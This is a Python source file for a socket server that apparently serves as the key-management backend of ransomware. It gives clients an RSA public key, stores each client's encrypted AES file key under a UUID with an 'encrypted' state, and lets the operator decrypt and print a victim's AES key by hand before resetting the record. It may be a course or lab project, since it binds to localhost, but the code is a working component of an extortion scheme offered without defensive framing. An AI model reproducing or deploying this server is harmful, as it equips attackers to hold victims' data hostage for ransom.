import socket, json, struct, os, sys, base64
from datetime import datetime
import threading
import RSA_algorithm 

#setup configure
SERVER_IP = "127.0.0.1"
SERVER_PORT = 6967

DATA_DIR = "./src/DBs"
CLIENT_DB_FILE = os.path.join(DATA_DIR, "clients.json")
RSA_KEY_FILE = os.path.join(DATA_DIR, "server_rsa.json")

def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data

def recv_json(sock):
    raw_len = recv_exact(sock, 4)
    msg_len = struct.unpack("!I", raw_len)[0]
    data = recv_exact(sock, msg_len)
    return json.loads(data.decode())

def send_json(sock, payload):
    data = json.dumps(payload).encode()
    sock.sendall(struct.pack("!I", len(data)) + data)

def ensure_dir():
    os.makedirs(DATA_DIR, exist_ok=True)


# DB check, load and save data
def load_client_db():
    if not os.path.exists(CLIENT_DB_FILE):
        return {}
    with open(CLIENT_DB_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_client_db(db):
    with open(CLIENT_DB_FILE, "w") as f:
        json.dump(db, f, indent=2)


#RSA managing function
def load_or_create_rsa_keys():
    if os.path.exists(RSA_KEY_FILE):
        with open(RSA_KEY_FILE, "r") as f:
            data = json.load(f)
            private_pem = data["private_key"].encode()
            public_pem = data["public_key"].encode()

            private_key = RSA_algorithm.serialization.load_pem_private_key(
                private_pem,
                password=None,
                backend=RSA_algorithm.default_backend()
            )
            public_key = RSA_algorithm.load_public_key(public_pem)
            return private_key, public_key, public_pem.decode()

    #generate rsa keypair and save
    private_key, public_key = RSA_algorithm.generate_rsa_keypair()
    private_pem = RSA_algorithm.serialize_key(private_key, is_private=True)
    public_pem = RSA_algorithm.serialize_key(public_key)

    with open(RSA_KEY_FILE, "w") as f:
        json.dump({
            "private_key": private_pem.decode(),
            "public_key": public_pem.decode()
        }, f, indent=2)

    return private_key, public_key, public_pem.decode()


#client handler
def handle_client(sock, addr, server_public_pem):
    try:
        request = recv_json(sock)
        client_id = request.get("client_id")
        action = request.get("action")

        if not client_id or not action:
            return

        db = load_client_db()
        now = datetime.now().isoformat()

        #request registration
        if action == "request_encryption":
            if client_id in db and db[client_id]["state"] == "encrypted":
                send_json(sock, {"status": "DENY"})
            else:
                send_json(sock, {
                    "status": "ALLOW",
                    "public_key": server_public_pem
                })

        #request aes key submission
        elif action == "submit_key":
            if client_id in db and db[client_id]["state"] == "encrypted":
                send_json(sock, {"status": "REJECT"})
                return

            enc_key_b64 = request.get("encrypted_aes_key")
            if not enc_key_b64:
                return

            db[client_id] = {
                "state": "encrypted",
                "encrypted_aes_key": enc_key_b64,
                "creation_date": now
            }
        
            save_client_db(db)
            send_json(sock, {"status": "STORED"})
        elif action == "decrypt_done":
            if client_id in db:
                del db[client_id]
                save_client_db(db)
                send_json(sock, {"status": "RESET"})
            else:
                send_json(sock, {"status": "NOT_FOUND"})

    except Exception as e:
        print(f"[!] Client error {addr}: {e}")
    finally:
        sock.close()

#input uuid to get aes key function
def manual_decrypt_loop(private_key):
    while True:
        print("\nEnter client UUID (or 'exit'):")
        server_input = input("> ").strip()

        if server_input.lower() == "exit":
            print("exiting key release loop.")
            break

        db = load_client_db()

        if server_input not in db:
            print("!!! uuid not found.")
            continue

        enc_key_b64 = db[server_input]["encrypted_aes_key"]
        enc_key = base64.b64decode(enc_key_b64)

        aes_key = RSA_algorithm.decryption_rsa(private_key, enc_key)

        print("\n[DECRYPT AUTHORIZED]")
        print(f"Client uuid : {server_input}")
        print(f"AES Key (hex): {aes_key.hex()}")
        print("===================================")


def main():
    ensure_dir()

    private_key, public_key, public_pem = load_or_create_rsa_keys()

    print("server RSA key loaded.")
    print("starting server...")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)

    # start manual key release thread
    threading.Thread(
        target=manual_decrypt_loop,
        args=(private_key,),
        daemon=True
    ).start()

    print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        client_sock, addr = server_socket.accept()
        threading.Thread(
            target=handle_client,
            args=(client_sock, addr, public_pem),
            daemon=True
        ).start()

if __name__ == "__main__":
    main()
